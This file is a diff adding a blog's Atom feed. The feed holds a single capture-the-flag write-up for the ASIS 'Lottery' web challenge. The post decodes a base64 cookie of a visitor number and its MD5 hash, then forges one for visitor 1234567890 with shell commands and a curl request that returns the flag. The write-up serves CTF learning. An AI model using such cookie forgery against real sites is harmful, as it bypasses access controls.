@@ -1,0 +1,73 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Web | staring into /dev/null]]></title>
+  <link href="http://barrebas.github.io/blog/categories/web/atom.xml" rel="self"/>
+  <link href="http://barrebas.github.io/"/>
+  <updated>2014-11-01T15:20:37+01:00</updated>
+  <id>http://barrebas.github.io/</id>
+  <author>
+    <name><![CDATA[barrebas]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[ASIS-CTF: Lottery]]></title>
+    <link href="http://barrebas.github.io/blog/2014/11/01/asis-ctf-lottery/"/>
+    <updated>2014-11-01T14:52:32+01:00</updated>
+    <id>http://barrebas.github.io/blog/2014/11/01/asis-ctf-lottery</id>
+    <content type="html"><![CDATA[<p>Lottery was a 100 point web challenge in the ASIS Finals CTF. The description only said &lsquo;Go here: <a href="http://asis-ctf.ir:12437">http://asis-ctf.ir:12437</a>&rsquo;. That webpage was mostly non-functional, but said that the 1234567890th visitor would win a <em>prize</em>. Gee, I wonder what that is? My browser informed me that there were no cookies, but I wasn&rsquo;t convinced.</p>
+
+<!--more-->
+
+
+<p><img src="/assets/asisctf/lottery-01.png" alt="" /></p>
+
+<p>I turned to <code>curl</code>. Luckily, curl informed me that there was indeed a cookie been set. A cookie named &lsquo;Visitor&rsquo;, no less:</p>
+
+<p><img src="/assets/asisctf/lottery-02.png" alt="" /></p>
+
+<p>The value looked like base64 so I decoded it:</p>
+
+<pre><code>$ echo -ne 'MTM4NjozNjM3NjNlNWMzZGMzYTY4YjM5OTA1OGMzNGFlY2YyYw==' |base64 -d
+1386:363763e5c3dc3a68b399058c34aecf2c
+</code></pre>
+
+<p>Hmm. I figured that first number was a visitor number. What could the second string be? MD5 maybe?</p>
+
+<pre><code>$ echo -ne 1386 |md5sum
+363763e5c3dc3a68b399058c34aecf2c  -
+</code></pre>
+
+<p>Spot on. It&rsquo;s now easy to fake the right cookie:</p>
+
+<pre><code>$ echo -ne 1234567890 |md5sum
+e807f1fcf82d132f9bb018ca6738a19f  -
+$ echo -ne '1234567890:e807f1fcf82d132f9bb018ca6738a19f' |base64
+MTIzNDU2Nzg5MDplODA3ZjFmY2Y4MmQxMzJmOWJiMDE4Y2E2NzM4YTE5Zg==
+</code></pre>
+
+<p>And feed it into curl:</p>
+
+<pre><code>$ curl -v http://asis-ctf.ir:12437/ --cookie "Visitor=MTIzNDU2Nzg5MDplODA3ZjFmY2Y4MmQxMzJmOWJiMDE4Y2E2NzM4YTE5Zg=="
+* About to connect() to asis-ctf.ir port 12437 (#0)
+*   Trying 87.107.124.12...
+* connected
+* Connected to asis-ctf.ir (87.107.124.12) port 12437 (#0)
+&gt; GET / HTTP/1.1
+&gt; User-Agent: curl/7.26.0
+&gt; Host: asis-ctf.ir:12437
+&gt; Accept: */*
+&gt; Cookie: Visitor=MTIzNDU2Nzg5MDplODA3ZjFmY2Y4MmQxMzJmOWJiMDE4Y2E2NzM4YTE5Zg==
+&gt; 
+...snip...
+Google+"&gt;&lt;/a&gt; &lt;/div&gt;&lt;/div&gt;&lt;div class="data-wrapper"&gt;&lt;p class="title"&gt;The 1234567890 th visitor, the prize awarded.&lt;/p&gt;&lt;div class="content"&gt;Anyone who has visited our site is the 1234567890 th Special prizes are awarded. &lt;br/&gt;the flag is: ASIS_9f1af649f25108144fc38a01f8767c0c&lt;/div&gt;&lt;/div&gt;&lt;div class="footer"&gt;&lt;div class="p
+</code></pre>
+
+<p>The flag is <code>ASIS_9f1af649f25108144fc38a01f8767c0c</code>. Easy!</p>
+]]></content>
+  </entry>
+  
+</feed>
